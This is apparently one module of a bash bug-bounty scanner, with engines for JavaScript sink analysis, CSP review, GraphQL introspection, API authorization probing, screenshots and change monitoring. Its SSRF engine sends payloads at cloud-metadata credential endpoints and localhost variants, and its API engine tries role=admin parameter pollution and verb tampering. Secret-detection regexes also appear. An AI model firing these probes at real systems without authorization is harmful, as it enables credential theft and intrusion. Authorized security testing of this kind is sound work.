#!/bin/bash
# ══════════════════════════════════════════════════════
#  MOD V4: Advanced Engines
#  JS AST/heuristics, CSP, SSRF, GraphQL, API auth,
#  screenshot intelligence, autonomous diffing
# ══════════════════════════════════════════════════════

v4_emit_finding() {
  local severity="$1"
  local title="$2"
  local confidence="$3"
  local evidence="$4"
  local reproduction="$5"
  local source="$6"
  local bucket="$7"
  local out_dir="$OUTPUT_DIR/vulns/v4"
  mkdir -p "$out_dir"
  printf '%s%s[VULN]%s [%s] %s (conf=%s)\n' "${RED:-}" "${BOLD:-}" "${NC:-}" "$severity" "$title" "$confidence"
  printf '[%s] [%s] %s | conf=%s | %s\n' "$(date +%T)" "$severity" "$title" "$confidence" "$evidence" >> "$out_dir/findings.txt" 2>/dev/null || true
  printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$severity" "$title" "$confidence" "$source" "$evidence" "$reproduction" >> "$out_dir/findings.tsv" 2>/dev/null || true
  if command -v bh_record_finding >/dev/null 2>&1; then
    bh_record_finding "$severity" "$title" "$confidence" "$evidence" "$reproduction" "$source"
  fi
  [[ -n "$bucket" ]] && printf '%s\n' "$title" >> "$out_dir/${bucket}.txt" 2>/dev/null || true
}

v4_confidence_from_evidence() {
  local evidence_count="${1:-0}"
  local oob="${2:-0}"
  local base="${3:-40}"
  bh_confidence_score "$base" "$evidence_count" "$oob"
}

v4_extract_js_fingerprint() {
  local content="$1"
  printf '%s' "$content" | tr -d '\n' | sha256sum | cut -c1-16
}

v4_similarity_ratio() {
  local a="$1"
  local b="$2"
  local len_a len_b min_len common ratio
  len_a=${#a}
  len_b=${#b}
  (( len_a == 0 || len_b == 0 )) && { printf '0'; return; }
  min_len=$len_a
  (( len_b < min_len )) && min_len=$len_b
  common=$(comm -12 <(printf '%s' "$a" | fold -w1 | sort -u) <(printf '%s' "$b" | fold -w1 | sort -u) | wc -l)
  ratio=$(( (common * 100) / (min_len > 0 ? min_len : 1) ))
  printf '%s' "$ratio"
}

v4_ast_scan_js() {
  local jsurl="$1"
  local content="$2"
  local tmp_file
  tmp_file=$(mktemp /tmp/bughunter_js_XXXXXX.js)
  printf '%s' "$content" > "$tmp_file"

  if ! cmd_exists node; then
    rm -f "$tmp_file"
    return 0
  fi

  local ast_output=""
  if node -e "require.resolve('esprima')" >/dev/null 2>&1; then
    ast_output=$(node - "$jsurl" "$tmp_file" <<'NODE' 2>/dev/null || true
const fs = require('fs');
const url = process.argv[2];
const file = process.argv[3];
const code = fs.readFileSync(file, 'utf8');
let esprima;
try { esprima = require('esprima'); } catch (e) { process.exit(0); }
let ast;
try { ast = esprima.parseScript(code, { loc: true, tolerant: true }); }
catch (e1) {
  try { ast = esprima.parseModule(code, { loc: true, tolerant: true }); }
  catch (e2) { process.exit(0); }
}
const hits = [];
function loc(node) { return node && node.loc && node.loc.start ? node.loc.start.line : 0; }
function emit(kind, detail, line) { hits.push({ kind, detail, line, url }); }
function memberName(node) {
  if (!node || node.type !== 'MemberExpression') return '';
  const obj = node.object && node.object.type === 'Identifier' ? node.object.name : (node.object && node.object.type === 'MemberExpression' ? memberName(node.object) : '');
  const prop = node.property && node.property.type === 'Identifier' ? node.property.name : (node.property && node.property.type === 'Literal' ? String(node.property.value) : '');
  return [obj, prop].filter(Boolean).join('.');
}
function walk(node) {
  if (!node || typeof node.type !== 'string') return;
  if (node.type === 'CallExpression') {
    const callee = node.callee;
    const name = callee.type === 'Identifier' ? callee.name : memberName(callee);
    if (/^(eval|setTimeout|setInterval|fetch|Function)$/.test(name)) emit('sink', name, loc(node));
    if (name.endsWith('postMessage')) emit('postMessage', name, loc(node));
    if (name.endsWith('serviceWorker.register')) emit('serviceWorker', name, loc(node));
    if (name.includes('localStorage') || name.includes('sessionStorage')) emit('storage', name, loc(node));
    if (name.endsWith('XMLHttpRequest') || name.endsWith('WebSocket')) emit('client_ssrf', name, loc(node));
  }
  if (node.type === 'NewExpression') {
    const name = node.callee && node.callee.type === 'Identifier' ? node.callee.name : '';
    if (name === 'Function') emit('sink', 'new Function', loc(node));
    if (name === 'WebSocket') emit('client_ssrf', 'new WebSocket', loc(node));
  }
  if (node.type === 'AssignmentExpression') {
    const lhs = memberName(node.left);
    if (/innerHTML|outerHTML|insertAdjacentHTML|document.write|document.writeln|window.name|location\.(href|assign|replace|hash|search)/.test(lhs)) emit('dom_sink', lhs, loc(node));
    if (/__proto__|constructor\.prototype|prototype/.test(lhs)) emit('prototype_pollution', lhs, loc(node));
  }
  if (node.type === 'Literal' && typeof node.value === 'string') {
    if (/\/graphql|__schema|sourceMappingURL|webpackChunk|__NEXT_DATA__|serviceWorker|callback=|jsonp/i.test(node.value)) emit('string', node.value.slice(0, 120), loc(node));
    if (/AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|ghp_[A-Za-z0-9]{36}|xox[baprs]-|eyJ[A-Za-z0-9_-]+\./.test(node.value)) emit('secret', node.value.slice(0, 120), loc(node));
  }
  for (const key of Object.keys(node)) {
    const value = node[key];
    if (!value) continue;
    if (Array.isArray(value)) {
      for (const child of value) walk(child);
    } else if (typeof value.type === 'string') {
      walk(value);
    }
  }
}
walk(ast);
for (const hit of hits) console.log(JSON.stringify(hit));
NODE
)
  elif node -e "require.resolve('tree-sitter')" >/dev/null 2>&1 && node -e "require.resolve('tree-sitter-javascript')" >/dev/null 2>&1; then
    ast_output=$(node - "$jsurl" "$tmp_file" <<'NODE' 2>/dev/null || true
const fs = require('fs');
const Parser = require('tree-sitter');
const JavaScript = require('tree-sitter-javascript');
const url = process.argv[2];
const file = process.argv[3];
const code = fs.readFileSync(file, 'utf8');
const parser = new Parser();
parser.setLanguage(JavaScript);
const tree = parser.parse(code);
const out = [];
function walk(node) {
  if (!node) return;
  const text = code.slice(node.startIndex, node.endIndex);
  if (/eval\(|new Function|postMessage|innerHTML|outerHTML|__proto__|constructor\.prototype|serviceWorker|\/graphql|sourceMappingURL/.test(text)) {
    out.push(JSON.stringify({ kind: 'tree-sitter', detail: text.slice(0, 120), line: node.startPosition.row + 1, url }));
  }
  for (let i = 0; i < node.namedChildCount; i++) walk(node.namedChild(i));
}
walk(tree.rootNode);
console.log(out.join('\n'));
NODE
)
  fi

  rm -f "$tmp_file"
  [[ -n "$ast_output" ]] && printf '%s\n' "$ast_output"
}

v4_source_map_scan() {
  local jsurl="$1"
  local content="$2"
  local map_url
  map_url=$(printf '%s' "$content" | grep -oP 'sourceMappingURL=\K[^[:space:]]+' | tail -1)
  [[ -z "$map_url" ]] && map_url="${jsurl}.map"
  local map_content
  map_content=$(curl -sk --max-time "$TIMEOUT" "$map_url" 2>/dev/null)
  [[ -z "$map_content" ]] && return 0

  printf '%s\n' "$map_content" | jq -r '.sources[]?, .sourcesContent[]?' 2>/dev/null | head -50 >> "$OUTPUT_DIR/vulns/v4/js/source_map_hits.txt" || true
  if printf '%s' "$map_content" | grep -qiE 'SECRET|TOKEN|KEY=|PRIVATE KEY|JWT|graphql'; then
    v4_emit_finding "medium" "Source-map secret exposure" "72" "url=$map_url" "Open the source map and inspect sourcesContent for leaked secrets or routes" "js:source-map" "source_map_secrets"
  fi
}

mod_v4_js_engine() {
  log_section "MOD V4.1: Advanced JavaScript Engine"
  local J="$OUTPUT_DIR/vulns/v4/js"
  mkdir -p "$J"
  local JS_FILES="$OUTPUT_DIR/urls/js_files.txt"
  [[ ! -f "$JS_FILES" ]] && return

  local total_js
  total_js=$(wc -l < "$JS_FILES" 2>/dev/null || echo 0)
  log_info "JS targets: $total_js"

  local sinks_regex='(document\.write|innerHTML|outerHTML|insertAdjacentHTML|eval\(|setTimeout\s*\(\s*["\x27`]|setInterval\s*\(\s*["\x27`]|new\s+Function\(|postMessage\s*\(|window\.name|location\.(href|assign|replace|hash|search)|document\.(URL|documentURI|baseURI)|localStorage|sessionStorage|indexedDB)'
  local sources_regex='(location\.search|location\.hash|document\.cookie|document\.referrer|window\.name|postMessage|localStorage|sessionStorage|indexedDB|navigator\.userAgent)'

  head -250 "$JS_FILES" | while IFS= read -r jsurl; do
    CONTENT="$(bh_cache_get "js:$jsurl" 2>/dev/null || true)"
    if [[ -z "$CONTENT" ]]; then
      CONTENT=$(curl -sk --max-time "$TIMEOUT" "$jsurl" 2>/dev/null)
      bh_cache_put "js:$jsurl" "$CONTENT" 2>/dev/null || true
    fi
    [[ -z "$CONTENT" ]] && continue

    local fingerprint
    fingerprint=$(v4_extract_js_fingerprint "$CONTENT")
    printf '%s\t%s\n' "$jsurl" "$fingerprint" >> "$J/fingerprints.tsv"

    local sink_hits source_hits ast_hits risk confidence evidence reproduction
    sink_hits=$(printf '%s' "$CONTENT" | grep -oP "$sinks_regex" 2>/dev/null | wc -l)
    source_hits=$(printf '%s' "$CONTENT" | grep -oP "$sources_regex" 2>/dev/null | wc -l)
    ast_hits=$(v4_ast_scan_js "$jsurl" "$CONTENT" | tee -a "$J/ast_hits.jsonl" | wc -l)
    v4_source_map_scan "$jsurl" "$CONTENT"
    risk=$((sink_hits * 12 + source_hits * 8 + ast_hits * 6))
    confidence=$(v4_confidence_from_evidence "$((sink_hits + source_hits + ast_hits))" 0 40)
    evidence="sinks=$sink_hits sources=$source_hits ast_hits=$ast_hits fingerprint=$fingerprint"
    reproduction="Fetch $jsurl, inspect AST hits, source-map results, and source→sink flow using the stored fingerprint"

    if (( sink_hits > 0 )); then
      v4_emit_finding "high" "JS sink chain candidate" "$confidence" "$evidence" "$reproduction" "js:regex" "sink_chains"
    fi

    if printf '%s' "$CONTENT" | grep -qP '__proto__|constructor\s*\[\s*["\x27]prototype|lodash\.merge|deepmerge|Object\.assign'; then
      v4_emit_finding "high" "Prototype pollution pattern" "${confidence}" "${evidence}; prototype pattern observed" "Review merge/object assignment flow in $jsurl" "js:proto" "prototype_pollution"
    fi

    if printf '%s' "$CONTENT" | grep -qP 'addEventListener\s*\(\s*["\x27]message["\x27]'; then
      if ! printf '%s' "$CONTENT" | grep -qP 'event\.origin|message\.origin|e\.origin'; then
        v4_emit_finding "medium" "postMessage origin check missing" "${confidence}" "message listener without origin validation" "Add origin check before processing postMessage in $jsurl" "js:postmessage" "postmessage"
      fi
    fi

    if printf '%s' "$CONTENT" | grep -qP 'graphql|__schema|apollo|relay'; then
      v4_emit_finding "medium" "GraphQL client artifact" "${confidence}" "GraphQL keyword(s) found in JS bundle" "Inspect GraphQL endpoint and query variables in $jsurl" "js:graphql" "graphql"
    fi

    if printf '%s' "$CONTENT" | grep -qP 'serviceWorker|navigator\.serviceWorker'; then
      v4_emit_finding "medium" "Service worker usage" "${confidence}" "service worker registration present" "Audit service worker scope and caching behavior in $jsurl" "js:sw" "service_worker"
    fi

    if printf '%s' "$CONTENT" | grep -qP 'graphql|__schema'; then
      printf '%s\t%s\n' "$jsurl" "graphql_hint" >> "$J/graphql_hints.tsv"
    fi

    if command -v bh_db_upsert_asset_score >/dev/null 2>&1; then
      bh_db_upsert_asset_score js "$jsurl" "$risk" 0 0 "$confidence" || true
      bh_db_upsert_risk_score js "$jsurl" "$risk" "$confidence" "$evidence" || true
    fi

    if cmd_exists jsluice; then
      jsluice urls 2>/dev/null <<<"$CONTENT" | sort -u >> "$J/urls_from_js.txt" || true
      jsluice secrets 2>/dev/null <<<"$CONTENT" | sort -u >> "$J/secrets_from_js.txt" || true
    fi

    if cmd_exists semgrep; then
      printf '%s' "$CONTENT" > /tmp/bughunter_js_$$.js
      semgrep --quiet --config=p/javascript --lang=javascript /tmp/bughunter_js_$$.js 2>/dev/null | head -40 >> "$J/semgrep_hits.txt" || true
      rm -f /tmp/bughunter_js_$$.js
    fi

    if command -v tree-sitter >/dev/null 2>&1 || cmd_exists tree-sitter; then
      printf '%s\n' "$jsurl" >> "$J/tree_sitter_candidates.txt"
    fi
  done

  if [[ -f "$J/urls_from_js.txt" ]]; then
    sort -u "$J/urls_from_js.txt" -o "$J/urls_from_js.txt" 2>/dev/null || true
  fi
  if [[ -f "$J/secrets_from_js.txt" ]]; then
    sort -u "$J/secrets_from_js.txt" -o "$J/secrets_from_js.txt" 2>/dev/null || true
  fi
}

mod_v4_csp_engine() {
  log_section "MOD V4.2: CSP Analysis & Bypass Research"
  local C="$OUTPUT_DIR/vulns/v4/csp"
  mkdir -p "$C"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  head -25 "$LIVE" | while IFS= read -r url; do
    local hdr body csp header_risk bypass_class confidence evidence reproduction
    hdr=$(curl -skI --max-time "$TIMEOUT" "$url" 2>/dev/null)
    body=$(curl -sk --max-time "$TIMEOUT" "$url" 2>/dev/null)
    csp=$(printf '%s\n%s' "$hdr" "$body" | grep -iE 'content-security-policy|<meta[^>]+content-security-policy' | head -1)
    [[ -z "$csp" ]] && continue

    header_risk=0
    evidence="$(printf '%s' "$csp" | tr '\n' ' ')"
    reproduction="Open $url and review CSP header/meta directives"
    bypass_class=""

    printf '%s' "$csp" | grep -qiE 'unsafe-inline' && { header_risk=$((header_risk + 25)); bypass_class="unsafe-inline"; }
    printf '%s' "$csp" | grep -qiE 'unsafe-eval' && { header_risk=$((header_risk + 20)); bypass_class="unsafe-eval"; }
    printf '%s' "$csp" | grep -qiE 'strict-dynamic' || header_risk=$((header_risk + 10))
    printf '%s' "$csp" | grep -qiE 'blob:|data:|wasm-unsafe-eval|object-src \*|frame-ancestors \*|base-uri \*|form-action \*' && header_risk=$((header_risk + 15))
    printf '%s' "$csp" | grep -qiE '\*' && header_risk=$((header_risk + 10))
    printf '%s' "$csp" | grep -qiE 'nonce-|sha256-|sha384-|sha512-' && header_risk=$((header_risk - 5))

    if printf '%s' "$body" | grep -qiE 'jsonp|callback=|trustedTypes|angular|react|vue|postMessage|serviceWorker'; then
      header_risk=$((header_risk + 15))
      [[ -z "$bypass_class" ]] && bypass_class="third-party gadget"
    fi

    if printf '%s' "$body" | grep -qiE '<script[^>]+src=.*(cdn|cdnjs|jsdelivr|unpkg|googleapis)|blob:|data:'; then
      header_risk=$((header_risk + 10))
      [[ -z "$bypass_class" ]] && bypass_class="trusted asset"
    fi

    confidence=$(v4_confidence_from_evidence 2 0 "$header_risk")
    v4_emit_finding "medium" "CSP risk candidate" "$confidence" "$evidence | bypass=$bypass_class" "$reproduction" "csp" "csp"
    printf '%s\t%s\t%s\n' "$url" "$header_risk" "$bypass_class" >> "$C/csp_risk.tsv"
    command -v bh_db_upsert_attack_surface >/dev/null 2>&1 && bh_db_upsert_attack_surface csp "$url" "$confidence" "$evidence" || true
    command -v bh_db_upsert_risk_score >/dev/null 2>&1 && bh_db_upsert_risk_score csp "$url" "$header_risk" "$confidence" "$evidence" || true
  done
}

mod_v4_ssrf_engine() {
  log_section "MOD V4.3: Advanced SSRF Engine"
  local S="$OUTPUT_DIR/vulns/v4/ssrf"
  mkdir -p "$S"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  local oob_domain=""
  if cmd_exists interactsh-client; then
    oob_domain="$(interactsh-client -json -o "$S/interactsh.json" 2>/dev/null & echo $! >/tmp/bughunter_interactsh.pid; sleep 2; grep -o '"url":"[^"]*"' "$S/interactsh.json" 2>/dev/null | head -1 | cut -d'"' -f4)"
  fi
  [[ -z "$oob_domain" ]] && oob_domain="$(printf '%s' "$DOMAIN$(date +%s)" | md5sum | cut -c1-8).oast.fun"
  printf '%s\n' "$oob_domain" > "$S/oob_domain.txt"

  local payloads=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/latest/api/token"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://100.100.100.200/latest/meta-data/"
    "http://169.254.169.254/opc/v1/instance/"
    "http://169.254.169.254/metadata/v1/"
    "http://kubernetes.default.svc/"
    "http://127.0.0.1/"
    "http://localhost/"
    "http://[::1]/"
    "http://2130706433/"
    "http://0177.0.0.1/"
    "gopher://127.0.0.1:80/_GET%20/"
    "http://${oob_domain}/ssrf"
  )

  local imds_headers=(
    "Metadata-Flavor: Google"
    "Metadata: true"
    "X-aws-ec2-metadata-token: fetch"
  )

  local candidates="$OUTPUT_DIR/urls/gf_ssrf.txt"
  [[ -f "$candidates" ]] || candidates="$OUTPUT_DIR/urls/all_urls.txt"

  head -80 "$candidates" 2>/dev/null | while IFS= read -r target; do
    [[ -z "$target" ]] && continue
    local base
    base="$(printf '%s' "$target" | cut -d'?' -f1)"
    for payload in "${payloads[@]}"; do
      local enc resp
      enc=$(python3 - <<PY 2>/dev/null
import urllib.parse
print(urllib.parse.quote("$payload", safe=''))
PY
)
      resp=$(curl -sk --max-time "$TIMEOUT" "${base}?url=${enc}&dest=${enc}&target=${enc}&next=${enc}&redirect=${enc}" 2>/dev/null)
      if printf '%s' "$resp" | grep -qiE 'metadata|ami-id|instance-id|computeMetadata|kubernetes|root:x:|127\.0\.0\.1|localhost|privateIpv4'; then
        v4_emit_finding "high" "SSRF candidate" "78" "payload=$payload base=$base" "Replay request with payload and inspect backend response; verify with OOB callback if available" "ssrf" "ssrf"
        printf '%s\t%s\n' "$base" "$payload" >> "$S/candidates.tsv"
        command -v bh_db_upsert_attack_surface >/dev/null 2>&1 && bh_db_upsert_attack_surface ssrf "$base" 78 "payload=$payload" || true
        command -v bh_db_upsert_risk_score >/dev/null 2>&1 && bh_db_upsert_risk_score ssrf "$base" 78 78 "payload=$payload" || true
        break
      fi
    done

    for header in "${imds_headers[@]}"; do
      local header_name header_value header_resp
      header_name=${header%%:*}
      header_value=${header#*: }
      header_resp=$(curl -sk --max-time "$TIMEOUT" -H "$header_name: $header_value" "${base}?url=${enc}" 2>/dev/null)
      if printf '%s' "$header_resp" | grep -qiE 'metadata|instance-id|ami-id|computeMetadata'; then
        v4_emit_finding "high" "SSRF metadata header bypass candidate" "82" "payload=$payload header=$header_name" "Replay request with metadata-specific header and confirm disclosure or callback" "ssrf" "ssrf"
      fi
    done
  done
}

mod_v4_graphql_engine() {
  log_section "MOD V4.4: GraphQL Engine"
  local G="$OUTPUT_DIR/vulns/v4/graphql"
  mkdir -p "$G"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  local endpoints=(/graphql /api/graphql /v1/graphql /query /graphiql /graphql/v1)
  head -20 "$LIVE" | while IFS= read -r url; do
    for ep in "${endpoints[@]}"; do
      local gql="$url$ep"
      local introspection
      introspection=$(curl -sk --max-time "$TIMEOUT" -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' "$gql" 2>/dev/null)
      if printf '%s' "$introspection" | grep -q '__schema'; then
        v4_emit_finding "high" "GraphQL introspection enabled" "88" "endpoint=$gql" "POST introspection query to $gql and inspect schema" "graphql" "graphql"
        printf '%s\n' "$introspection" | jq '.' 2>/dev/null > "$G/$(bh_hash8 "$gql")_schema.json" || printf '%s\n' "$introspection" > "$G/$(bh_hash8 "$gql")_schema.raw"
        command -v bh_db_upsert_attack_surface >/dev/null 2>&1 && bh_db_upsert_attack_surface graphql "$gql" 88 "introspection" || true
        command -v bh_db_upsert_risk_score >/dev/null 2>&1 && bh_db_upsert_risk_score graphql "$gql" 88 88 "introspection" || true
      fi
      local batch
      batch=$(curl -sk --max-time "$TIMEOUT" -H 'Content-Type: application/json' -d '[{"query":"{__typename}"},{"query":"{__typename}"}]' "$gql" 2>/dev/null)
      if printf '%s' "$batch" | grep -q '__typename'; then
        v4_emit_finding "medium" "GraphQL batching candidate" "65" "endpoint=$gql" "Replay with batched query array; check if multiple operations are accepted" "graphql" "graphql"
        command -v bh_db_upsert_attack_surface >/dev/null 2>&1 && bh_db_upsert_attack_surface graphql "$gql" 65 "batching" || true
      fi
      if printf '%s' "$introspection" | grep -qiE 'mutation|subscription|query'; then
        printf '%s\t%s\n' "$gql" "schema_seen" >> "$G/schema_graph.tsv"
      fi
    done
  done
}

mod_v4_api_auth_engine() {
  log_section "MOD V4.5: API Authorization Engine"
  local A="$OUTPUT_DIR/vulns/v4/api_auth"
  mkdir -p "$A"
  local urls="$OUTPUT_DIR/urls/all_urls.txt"
  [[ ! -f "$urls" ]] && return

  grep -E '/api/|id=|user|account|profile|order|invoice|project|team|tenant' "$urls" 2>/dev/null | head -120 | while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    local base resp_naked resp_override resp_put resp_polluted
    base="$(printf '%s' "$url" | cut -d'?' -f1)"
    resp_naked=$(curl -sk --max-time "$TIMEOUT" "$base" 2>/dev/null)
    resp_override=$(curl -sk --max-time "$TIMEOUT" -H 'X-HTTP-Method-Override: GET' -X POST "$base" 2>/dev/null)
    resp_put=$(curl -sk --max-time "$TIMEOUT" -X PUT "$base" 2>/dev/null)
    resp_polluted=$(curl -sk --max-time "$TIMEOUT" "${base}&id=1&id=2&role=user&role=admin" 2>/dev/null)

    if [[ -n "$resp_naked" && -n "$resp_override" ]]; then
      local ratio
      ratio=$(v4_similarity_ratio "$resp_naked" "$resp_override")
      if (( ratio < 60 )); then
        v4_emit_finding "medium" "HTTP verb tampering candidate" "60" "base=$base similarity=$ratio" "Compare GET vs method override vs PUT responses for authorization discrepancies" "api_auth" "verb_tampering"
      fi
    fi

    if printf '%s' "$resp_polluted" | grep -qiE '"id"|"role"|"user"|"admin"|"account"|"owner"'; then
      v4_emit_finding "high" "Parameter pollution authorization candidate" "72" "base=$base" "Replay with duplicated id/role parameters and compare returned object ownership" "api_auth" "parameter_pollution"
    fi

    if printf '%s' "$base" | grep -qiE 'id=[0-9]+|/users/[0-9]+|/accounts/[0-9]+|/projects/[0-9]+'; then
      v4_emit_finding "high" "IDOR/BOLA candidate" "78" "url=$base" "Replace object identifiers and validate cross-account access" "api_auth" "idor"
    fi

    if command -v bh_db_upsert_attack_surface >/dev/null 2>&1; then
      bh_db_upsert_attack_surface api_auth "$base" 72 "verb_or_idor_candidate" || true
      bh_db_upsert_risk_score api_auth "$base" 72 72 "verb_or_idor_candidate" || true
    fi
  done
}

mod_v4_screenshot_intel() {
  log_section "MOD V4.6: Screenshot Intelligence"
  local V4S="$OUTPUT_DIR/vulns/v4/screenshots"
  mkdir -p "$V4S"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  if cmd_exists gowitness; then
    safe_run gowitness file -f "$LIVE" --destination "$OUTPUT_DIR/screenshots" --threads "$THREADS" || true
  fi
  if cmd_exists aquatone; then
    safe_run aquatone -out "$OUTPUT_DIR/screenshots/aquatone" < "$LIVE" 2>/dev/null || true
  fi

  local title
  head -20 "$LIVE" | while IFS= read -r url; do
    title=$(curl -sk --max-time "$TIMEOUT" "$url" 2>/dev/null | grep -oiP '(?<=<title>)[^<]+' | head -1)
    if printf '%s' "$title" | grep -qiE 'admin|login|signin|dashboard|console|portal'; then
      v4_emit_finding "medium" "Admin/login panel candidate" "68" "url=$url title=$title" "Review screenshot and verify authentication controls" "screenshot" "panels"
    fi
  done

  if [[ -f "$OUTPUT_DIR/subdomains/favicons.txt" ]]; then
    sort -u "$OUTPUT_DIR/subdomains/favicons.txt" -o "$OUTPUT_DIR/subdomains/favicons.txt" 2>/dev/null || true
  fi
}

mod_monitor() {
  log_section "MOD V4.7: Autonomous Monitor"
  local interval=86400
  [[ "${BH_WATCH:-0}" == "1" ]] && interval=300
  [[ "${BH_DAILY:-0}" == "1" ]] && interval=86400
  [[ "${BH_WEEKLY:-0}" == "1" ]] && interval=604800
  local snap_dir="$BH_STATE_DIR/snapshots"
  mkdir -p "$snap_dir"

  local take_snapshot
  take_snapshot() {
    local stamp
    stamp="$(date +%Y%m%d_%H%M%S)"
    cp "$OUTPUT_DIR/subdomains/all_subdomains.txt" "$snap_dir/${stamp}_subdomains.txt" 2>/dev/null || true
    cp "$OUTPUT_DIR/urls/all_urls.txt" "$snap_dir/${stamp}_urls.txt" 2>/dev/null || true
    cp "$OUTPUT_DIR/findings.txt" "$snap_dir/${stamp}_findings.txt" 2>/dev/null || true
  }

  local diff_snapshot
  diff_snapshot() {
    local latest_sub latest_url prev_sub prev_url
    latest_sub=$(ls -1 "$snap_dir"/*_subdomains.txt 2>/dev/null | tail -1)
    latest_url=$(ls -1 "$snap_dir"/*_urls.txt 2>/dev/null | tail -1)
    prev_sub=$(ls -1 "$snap_dir"/*_subdomains.txt 2>/dev/null | tail -2 | head -1)
    prev_url=$(ls -1 "$snap_dir"/*_urls.txt 2>/dev/null | tail -2 | head -1)
    [[ -n "$latest_sub" && -n "$prev_sub" ]] && comm -13 <(sort -u "$prev_sub") <(sort -u "$latest_sub") > "$snap_dir/new_subdomains.txt" || true
    [[ -n "$latest_url" && -n "$prev_url" ]] && comm -13 <(sort -u "$prev_url") <(sort -u "$latest_url") > "$snap_dir/new_urls.txt" || true
  }

  if [[ "${BH_CONTINUOUS:-0}" == "1" ]]; then
    while true; do
      take_snapshot
      diff_snapshot
      sleep "$interval"
    done
  elif [[ "${BH_MONITOR:-0}" == "1" || "${BH_DIFF:-0}" == "1" ]]; then
    take_snapshot
    diff_snapshot
    log_info "Snapshot + diff refreshed in $snap_dir"
  fi
}

mod_v4_engines() {
  log_section "MOD V4: Advanced Security Engines"
  mod_v4_js_engine
  mod_v4_csp_engine
  mod_v4_graphql_engine
  mod_v4_api_auth_engine
  mod_v4_ssrf_engine
  mod_v4_screenshot_intel
}
